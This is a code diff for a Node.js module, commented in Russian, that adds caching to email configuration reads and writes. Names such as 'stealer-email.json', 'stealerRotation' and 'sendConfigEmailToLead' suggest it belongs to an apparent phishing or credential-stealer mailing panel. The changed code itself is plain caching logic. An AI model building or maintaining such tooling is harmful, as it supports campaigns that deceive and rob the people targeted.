@@ -15,9 +15,18 @@ let pushEventFn = function () {};
 
 const CONFIG_EMAIL_SENT_EVENT_LABEL = 'Send Email';
 
+/** Копия объекта конфига, чтобы вызывающий не мутировал кэш. */
+function cloneEmailConfig(obj) {
+  return JSON.parse(JSON.stringify(obj));
+}
+
+let _configEmailCache = null;
+let _stealerEmailCache = null;
+
 function init(opts) {
   if (opts && opts.dataDir) DATA_DIR = opts.dataDir;
   if (opts && typeof opts.pushEvent === 'function') pushEventFn = opts.pushEvent;
+  reloadMailConfigCachesFromDisk();
 }
 
 const STEALER_EMAIL_FILE = () => path.join(DATA_DIR, 'stealer-email.json');
@@ -51,7 +60,8 @@ function parseSmtpLines(line) {
   return result;
 }
 
-function readStealerEmailConfig() {
+/** Читает stealer с диска (без кэша). Может вызвать миграцию и writeStealerEmailConfig. */
+function loadStealerEmailConfigFromDisk() {
   try {
     const f = STEALER_EMAIL_FILE();
     if (fs.existsSync(f)) {
@@ -67,7 +77,8 @@ function readStealerEmailConfig() {
       if (legacy.smtp && legacy.smtpUser) {
         const smtpLine = [legacy.smtp, String(legacy.smtpPort || 587), legacy.smtpUser, legacy.smtpUser, legacy.smtpPass || ''].join(':');
         const migrated = { currentId: id, configs: [{ id, name: 'Default', smtpLine, html: legacy.html || '', senderName: legacy.senderName || '', title: legacy.title || '' }] };
-        writeStealerEmailConfig(migrated);
+        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+        fs.writeFileSync(STEALER_EMAIL_FILE(), JSON.stringify(migrated, null, 2), 'utf8');
         const cur = migrated.configs[0];
         return { currentId: id, configs: migrated.configs, current: cur };
       }
@@ -77,15 +88,7 @@ function readStealerEmailConfig() {
   return { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' } };
 }
 
-function writeStealerEmailConfig(data) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
-    fs.writeFileSync(STEALER_EMAIL_FILE(), JSON.stringify(toWrite || {}, null, 2), 'utf8');
-  } catch (e) {}
-}
-
-function readConfigEmail() {
+function loadConfigEmailFromDisk() {
   try {
     const f = CONFIG_EMAIL_FILE();
     if (fs.existsSync(f)) {
@@ -102,11 +105,50 @@ function readConfigEmail() {
   return { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' } };
 }
 
+function reloadMailConfigCachesFromDisk() {
+  _stealerEmailCache = loadStealerEmailConfigFromDisk();
+  _configEmailCache = loadConfigEmailFromDisk();
+}
+
+function readStealerEmailConfig() {
+  if (!_stealerEmailCache) reloadMailConfigCachesFromDisk();
+  return cloneEmailConfig(_stealerEmailCache);
+}
+
+function writeStealerEmailConfig(data) {
+  try {
+    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
+    fs.writeFileSync(STEALER_EMAIL_FILE(), JSON.stringify(toWrite || {}, null, 2), 'utf8');
+    const t = toWrite || {};
+    if (t.configs && Array.isArray(t.configs)) {
+      const currentId = t.currentId || (t.configs[0] && t.configs[0].id) || null;
+      const current = t.configs.find(function (c) { return c.id == currentId; }) || t.configs[0] || null;
+      _stealerEmailCache = { currentId, configs: t.configs, current };
+    } else {
+      _stealerEmailCache = loadStealerEmailConfigFromDisk();
+    }
+  } catch (e) {}
+}
+
+function readConfigEmail() {
+  if (!_configEmailCache) reloadMailConfigCachesFromDisk();
+  return cloneEmailConfig(_configEmailCache);
+}
+
 function writeConfigEmail(data) {
   try {
     if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
     const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
     fs.writeFileSync(CONFIG_EMAIL_FILE(), JSON.stringify(toWrite || {}, null, 2), 'utf8');
+    const t = toWrite || {};
+    if (t.configs && Array.isArray(t.configs)) {
+      const currentId = t.currentId || (t.configs[0] && t.configs[0].id) || null;
+      const current = t.configs.find(function (c) { return c.id == currentId; }) || t.configs[0] || null;
+      _configEmailCache = { currentId, configs: t.configs, current };
+    } else {
+      _configEmailCache = loadConfigEmailFromDisk();
+    }
   } catch (e) {}
 }
 
@@ -209,6 +251,7 @@ module.exports = {
   writeStealerEmailConfig,
   readConfigEmail,
   writeConfigEmail,
+  reloadMailConfigCachesFromDisk,
   leadHasAnyConfigEmailSentEvent,
   sendConfigEmailToLead,
   stealerRotation,
